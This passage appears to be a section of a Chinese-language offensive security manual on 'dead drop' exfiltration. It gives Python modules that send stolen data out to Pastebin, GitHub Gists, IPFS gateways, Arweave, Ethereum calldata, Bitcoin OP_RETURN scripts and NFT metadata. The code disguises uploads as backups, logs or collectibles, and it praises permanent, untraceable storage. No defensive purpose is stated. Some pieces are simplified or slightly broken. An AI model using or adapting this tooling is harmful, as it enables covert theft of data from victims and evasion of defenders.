## §7: 死信投递外泄 (Dead Drop Exfiltration)

### 7.1 Pastebin/GitHub Gist外泄

```python
#!/usr/bin/env python3
"""
死信投递外泄模块
利用公共平台作为数据中转站
策略：Pastebin、GitHub Gist、Hastebin、PrivateBin
"""

import requests
import json
import base64
import time
import random
import hashlib
from typing import Optional, Tuple
from datetime import datetime

class PastebinExfil:
    """Pastebin死信投递"""

    def __init__(self, api_key: str = None):
        self.api_key = api_key
        self.base_url = "https://pastebin.com/api/api_post.php"

    def create_paste(self, data: str, title: str = None, expire: str = "10M") -> Optional[str]:
        """创建Pastebin粘贴"""
        if title is None:
            title = f"Log_{random.randint(1000, 9999)}"

        payload = {
            "api_dev_key": self.api_key,
            "api_option": "paste",
            "api_paste_code": data,
            "api_paste_name": title,
            "api_paste_private": "1",  # Unlisted
            "api_paste_expire_date": expire,
        }

        try:
            resp = requests.post(self.base_url, data=payload)
            if resp.status_code == 200 and "pastebin.com" in resp.text:
                return resp.text.strip()
            return None
        except Exception:
            return None

    def read_paste(self, paste_id: str) -> Optional[str]:
        """读取Pastebin粘贴"""
        raw_url = f"https://pastebin.com/raw/{paste_id}"
        try:
            resp = requests.get(raw_url)
            if resp.status_code == 200:
                return resp.text
            return None
        except Exception:
            return None

class GitHubGistExfil:
    """GitHub Gist死信投递"""

    def __init__(self, github_token: str):
        self.github_token = github_token
        self.api_url = "https://api.github.com/gists"
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"token {github_token}",
            "Accept": "application/vnd.github.v3+json",
        })

    def create_gist(self, data: str, description: str = None, public: bool = False) -> Optional[str]:
        """创建Gist"""
        if description is None:
            description = f"Backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        # 分片数据 (Gist文件大小限制)
        if len(data) > 1000000:
            # 分片创建多个Gist
            return self._create_multi_gist(data, description)

        payload = {
            "description": description,
            "public": public,
            "files": {
                f"data_{random.randint(1000, 9999)}.txt": {
                    "content": data
                }
            }
        }

        try:
            resp = self.session.post(self.api_url, json=payload)
            if resp.status_code == 201:
                gist_data = resp.json()
                return gist_data["html_url"]
            return None
        except Exception as e:
            print(f"[!] Gist创建失败: {e}")
            return None

    def _create_multi_gist(self, data: str, description: str) -> Optional[str]:
        """创建多个Gist用于大数据"""
        chunk_size = 900000
        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

        urls = []
        for idx, chunk in enumerate(chunks):
            desc = f"{description} Part {idx + 1}/{len(chunks)}"
            payload = {
                "description": desc,
                "public": False,
                "files": {
                    f"part_{idx:03d}.txt": {"content": chunk}
                }
            }
            try:
                resp = self.session.post(self.api_url, json=payload)
                if resp.status_code == 201:
                    urls.append(resp.json()["html_url"])
            except Exception:
                continue
            time.sleep(random.uniform(1, 3))

        return urls[0] if urls else None

    def read_gist(self, gist_id: str) -> Optional[str]:
        """读取Gist内容"""
        url = f"{self.api_url}/{gist_id}"
        try:
            resp = self.session.get(url)
            if resp.status_code == 200:
                gist_data = resp.json()
                for filename, file_info in gist_data.get("files", {}).items():
                    return file_info.get("content", "")
            return None
        except Exception:
            return None
```

### 7.2 2026 IPFS/Arweave永久存储外泄

```python
#!/usr/bin/env python3
"""
IPFS/Arweave永久存储外泄模块 (2026)
利用去中心化存储网络进行数据外泄
优势：数据永久存储，无法删除，难以追踪
"""

import requests
import json
import base64
import os
import time
import random
from typing import Optional

class IPFSExfil:
    """IPFS外泄器"""

    def __init__(self, ipfs_api: str = "http://127.0.0.1:5001"):
        self.ipfs_api = ipfs_api

    def upload_to_ipfs(self, file_path: str) -> Optional[str]:
        """上传文件到IPFS"""
        url = f"{self.ipfs_api}/api/v0/add"

        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                resp = requests.post(url, files=files)

            if resp.status_code == 200:
                # IPFS返回JSON Lines格式
                result = json.loads(resp.text.split("\n")[0])
                cid = result.get("Hash")
                print(f"[+] IPFS上传成功: ipfs://{cid}")
                return cid
            return None

        except Exception as e:
            print(f"[!] IPFS上传失败: {e}")
            return None

    def upload_via_public_gateway(self, data: bytes) -> Optional[str]:
        """通过公共IPFS网关上传"""
        gateways = [
            "https://ipfs.io/api/v0/add",
            "https://dweb.link/api/v0/add",
            "https://cloudflare-ipfs.com/api/v0/add",
        ]

        for gateway in gateways:
            try:
                files = {"file": ("data.bin", data)}
                resp = requests.post(gateway, files=files)
                if resp.status_code == 200:
                    return json.loads(resp.text.split("\n")[0]).get("Hash")
            except Exception:
                continue

        return None

    def pin_content(self, cid: str) -> bool:
        """Pin内容以确保持久化"""
        url = f"{self.ipfs_api}/api/v0/pin/add?arg={cid}"
        resp = requests.post(url)
        return resp.status_code == 200

class ArweaveExfil:
    """Arweave永久存储外泄器"""

    def __init__(self, wallet_path: str = None):
        self.wallet_path = wallet_path
        self.gateway = "https://arweave.net"

    def _estimate_price(self, data_size: int) -> float:
        """估算存储费用 (AR)"""
        # Arweave价格: ~0.00001 AR per KB
        return data_size * 0.00001 / 1024

    def upload_to_arweave(self, data: bytes, tags: dict = None) -> Optional[str]:
        """上传到Arweave"""
        url = f"{self.gateway}/tx"

        if tags is None:
            tags = {
                "Content-Type": "application/octet-stream",
                "App-Name": "BackupService",
                "App-Version": "1.0.0",
            }

        # 构建交易 (简化版，实际需要使用arweave SDK)
        payload = {
            "data": base64.b64encode(data).decode(),
            "tags": [{"name": k, "value": v} for k, v in tags.items()],
        }

        try:
            resp = requests.post(url, json=payload)
            if resp.status_code == 200:
                tx_id = resp.json().get("id")
                print(f"[+] Arweave上传成功: ar://{tx_id}")
                return tx_id
            return None
        except Exception as e:
            print(f"[!] Arweave上传失败: {e}")
            return None

    def retrieve_from_arweave(self, tx_id: str) -> Optional[bytes]:
        """从Arweave检索数据"""
        url = f"{self.gateway}/{tx_id}"
        try:
            resp = requests.get(url)
            if resp.status_code == 200:
                return resp.content
            return None
        except Exception:
            return None
```

### 7.3 区块链交易数据嵌入外泄

```python
#!/usr/bin/env python3
"""
区块链交易数据嵌入外泄模块
利用区块链交易的data字段嵌入外泄数据
策略：Ethereum calldata、Bitcoin OP_RETURN、Solana memo
"""

import struct
import base64
import hashlib
from typing import Optional, List
from web3 import Web3

class EthereumCalldataExfil:
    """以太坊calldata外泄"""

    def __init__(self, rpc_url: str, private_key: str):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.account = self.w3.eth.account.from_key(private_key)
        self.contract_address = "0x0000000000000000000000000000000000000000"  # Zero address

    def _encode_data(self, data: bytes) -> bytes:
        """编码数据为calldata格式"""
        # 使用随机函数选择器作为伪装
        selector = hashlib.sha256(b"exfil").digest()[:4]
        # 数据格式: function_selector + offset + length + data
        encoded = selector + struct.pack(">I", 32) + struct.pack(">I", len(data))
        # 填充到32字节边界
        if len(data) % 32:
            data = data + b"\x00" * (32 - len(data) % 32)
        encoded += data
        return encoded

    def exfiltrate_via_transaction(self, data: bytes) -> Optional[str]:
        """
        通过以太坊交易外泄数据
        发送0 ETH交易到零地址，calldata中包含数据
        """
        calldata = self._encode_data(data)

        tx = {
            "from": self.account.address,
            "to": self.contract_address,
            "value": 0,
            "gas": 21000 + len(calldata) * 16,
            "gasPrice": self.w3.eth.gas_price,
            "nonce": self.w3.eth.get_transaction_count(self.account.address),
            "data": "0x" + calldata.hex(),
        }

        try:
            signed = self.account.sign_transaction(tx)
            tx_hash = self.w3.eth.send_raw_transaction(signed.rawTransaction)
            print(f"[+] 交易已发送: {tx_hash.hex()}")
            return tx_hash.hex()
        except Exception as e:
            print(f"[!] 交易发送失败: {e}")
            return None

class BitcoinOPReturnExfil:
    """比特币OP_RETURN外泄"""

    def __init__(self):
        self.max_op_return_size = 80  # 字节

    def build_op_return_script(self, data: bytes) -> bytes:
        """构建OP_RETURN脚本"""
        if len(data) > self.max_op_return_size:
            data = data[:self.max_op_return_size]

        # OP_RETURN + push_data + data
        script = b"\x6a"  # OP_RETURN
        script += bytes([len(data)])  # Push data length
        script += data

        return script

    def exfiltrate_via_op_return(self, data: bytes) -> List[bytes]:
        """分片外泄到多个OP_RETURN输出"""
        chunks = [data[i:i + self.max_op_return_size] for i in range(0, len(data), self.max_op_return_size)]
        scripts = [self.build_op_return_script(chunk) for chunk in chunks]
        return scripts
```

### 7.4 NFT元数据外泄

```python
#!/usr/bin/env python3
"""
NFT元数据外泄模块 (2026)
利用NFT元数据字段进行数据外泄
策略：tokenURI、attributes、animation_url
"""

import json
import base64
import random
import hashlib
from typing import Optional, Dict, Any

class NFTMetadataExfil:
    """NFT元数据外泄器"""

    def __init__(self):
        self.metadata_template = {
            "name": "",
            "description": "",
            "image": "",
            "external_url": "",
            "attributes": [],
            "animation_url": "",
        }

    def _chunk_data_for_attributes(self, data: bytes) -> List[Dict[str, Any]]:
        """将数据分片编码为NFT属性"""
        encoded = base64.b64encode(data).decode()
        chunk_size = 100

        attributes = []
        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i+chunk_size]
            attributes.append({
                "trait_type": f"metadata_{i // chunk_size}",
                "value": chunk,
                "display_type": "text",
            })

        return attributes

    def create_metadata_json(self, data: bytes, image_url: str = None) -> str:
        """创建包含外泄数据的NFT元数据JSON"""
        traits = self._chunk_data_for_attributes(data)

        metadata = {
            "name": f"Digital Artifact #{random.randint(1000, 9999)}",
            "description": "Unique digital collectible with embedded authentication data",
            "image": image_url or "https://ipfs.io/ipfs/QmDefault",
            "external_url": "",
            "attributes": [
                {"trait_type": "Series", "value": "Genesis"},
                {"trait_type": "Rarity", "value": "Legendary"},
                {"trait_type": "Data Hash", "value": hashlib.sha256(data).hexdigest()[:16]},
            ] + traits,
            "animation_url": "",
            "background_color": "000000",
        }

        return json.dumps(metadata, indent=2)

    def embed_in_animation_url(self, data: bytes) -> str:
        """将数据嵌入animation_url字段"""
        encoded = base64.urlsafe_b64encode(data).decode()
        return f"data:application/octet-stream;base64,{encoded}"
```

---

